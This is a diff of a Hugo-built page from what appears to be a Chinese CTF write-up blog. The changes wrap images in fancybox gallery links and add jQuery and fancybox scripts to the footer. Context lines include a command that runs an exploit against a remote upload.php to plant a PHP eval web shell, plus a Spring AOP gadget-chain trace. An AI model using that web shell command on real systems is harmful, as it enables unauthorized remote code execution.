@@ -227,7 +227,14 @@
         return base64.decode(data)
 </code></pre><p>然后跑exp就好了</p>
 <pre tabindex="0"><code>python test.py http://39.106.16.204:20871/upload.php &#34;echo &#39;&lt;?=@eval(\$_POST[0]);?&gt;&#39; &gt; shell.php&#34;
-</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png" alt="image-20250211210919337"></p>
+</code></pre><p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png" alt="image-20250211210919337"  />
+</a>
+</div>
+
+</p>
         </div>
         
         <div class="post-time-container">
@@ -262,7 +269,14 @@ AspectJAroundAdvice-&gt;invoke-&gt;
 org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;
 method.invoke()
 </code></pre><p>执行类是<code>org.springframework.aop.aspectj.AbstractAspectJAdvice</code>的<strong>invokeAdviceMethodWithGivenArgs</strong>方法</p>
-<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123020448769.png" alt="image-20250123020448769"></p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123020448769.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123020448769.png" alt="image-20250123020448769"  />
+</a>
+</div>
+
+</p>
 <pre tabindex="0"><code>    protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {
         Object[] actualArgs = args;
         if (this.aspectJAdviceMethod.getParameterCount() == 0) {
@@ -437,12 +451,18 @@ method.invoke()
         </main><footer class="footer">
     <div class="content has-text-centered">
     <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
+    
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+    
     <span>
         Powered by
         <a href="https://gohugo.io/" target="_blank">Hugo</a> &
         <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
     </span>
     </div>
-  </footer></body>
+  </footer>
+</body>
 </html>
 
